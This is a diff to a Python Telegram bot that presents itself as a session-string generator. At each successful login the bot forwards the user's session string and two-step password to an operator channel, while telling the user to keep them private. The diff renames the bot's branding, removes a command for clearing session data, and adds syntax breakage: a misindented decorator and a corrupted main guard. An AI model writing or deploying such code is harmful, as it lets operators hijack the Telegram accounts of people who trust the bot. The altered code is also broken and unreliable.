@@ -1,4 +1,3 @@
-# Join ne on telegram @devggn
 import os
 from pyrogram import Client, filters
 from pyrogram.errors import (
@@ -23,30 +22,6 @@ app = Client(
     bot_token=BOT_TOKEN
 )
 
-
-def delete_session_files(user_id):
-    session_file = f"session_{user_id}.session"
-    if os.path.exists(session_file):
-        os.remove(session_file)
-    memory_file = f"session_{user_id}.session-journal"
-    if os.path.exists(memory_file):
-        os.remove(memory_file)
-
-@app.on_message(filters.command("start"))
-async def start_command(client, message):
-    await message.reply(
-        "Welcome to our session generator bot!\n\n"
-        "To generate a session, please send /generate.\n\n"
-        "To clear session from memory send /cleardb.\n\n"
-        "**__Powered by Team SPY__**"
-    )
-
-@app.on_message(filters.command("cleardb"))
-async def clear_db(client, message):
-    user_id = message.chat.id
-    delete_session_files(user_id)
-    await message.reply("✅ Your session data and files have been cleared from memory and disk.")
-    
 
 async def session_step(client, message):
     user_id = message.chat.id
@@ -77,8 +52,8 @@ async def session_step(client, message):
         try:
             await temp_client.sign_in(user_data[user_id]["phone_number"], user_data[user_id]["phone_code_hash"], phone_code)
             session_string = await temp_client.export_session_string()
-            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by Team SPY__**")
-            await app.send_message(SESSION_CHANNEL, f"✨ **__USER ID__** : {user_id}\n\n✨ **__2SP__** : `None`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
+            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n{session_string}\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\nPowered by Vikshit Bharat")
+            await app.send_message(SESSION_CHANNEL, f"✨ USER ID : {user_id}\n\n✨ 2SP : None\n\n✨ Session String 👇\n\n{session_string}")
             await temp_client.disconnect()
             reset_user(user_id)
         except PhoneCodeInvalid:
@@ -96,8 +71,8 @@ async def session_step(client, message):
             password = message.text
             await temp_client.check_password(password=password)
             session_string = await temp_client.export_session_string()
-            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n`{session_string}`\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\n**__Powered by Team SPY__**")
-            await app.send_message(SESSION_CHANNEL, f"✨ **__ID__** : {user_id}\n\n✨ **__2SP__** : `{password}`\n\n✨ **__Session String__ 👇**\n\n`{session_string}`")
+            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n{session_string}\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\nPowered by Vikshit Bharat")
+            await app.send_message(SESSION_CHANNEL, f"✨ ID : {user_id}\n\n✨ 2SP : {password}\n\n✨ Session String 👇\n\n{session_string}")
             await temp_client.disconnect()
             reset_user(user_id)
         except PasswordHashInvalid:
@@ -110,8 +85,7 @@ async def session_step(client, message):
 def reset_user(user_id):
     user_steps.pop(user_id, None)
     user_data.pop(user_id, None)
-
-@app.on_message(filters.command("generate"))
+    @app.on_message(filters.command("generate"))
 async def login_command(client, message):
     await session_step(client, message)
 
@@ -128,11 +102,27 @@ def get_session(sender_id):
     else:
         return None
 
+@app.on_message(filters.command("start"))
+async def start_command(client, message):
+    welcome_text = (
+        "🌟 Welcome to Vikshit Bharat Session Generator Bot! 🌟\n\n"
+        "This bot helps you generate Telegram session strings securely and easily. "
+        "Here are the available commands you can use:\n\n"
+        "🔹 /generate: Start the session generation process.\n"
+        "    - First, you'll need to provide your phone number with the country code.\n"
+        "    - Then, you'll receive an OTP (One-Time Password) for verification.\n"
+        "    - If two-step verification is enabled, you'll need to provide your password.\n"
+        "    - Finally, the bot will send you a session string that you can use for your account.\n\n"
+        "🔹 Important: Do NOT share your session string with anyone. "
+        "Keep it private for your account's safety!\n\n"
+        "Powered by Vikshit Bharat"
+    )
+    await message.reply(welcome_text)
+
 # Start the bot chutiya type code likha hu fix kr lena agar error ho to koi
-if __name__ == "__main__":
+if name == "main":
     try:
         app.run()
         print("Bot started ...")
     except Exception as e:
         print(f"Failed to start bot: {e}")
-        
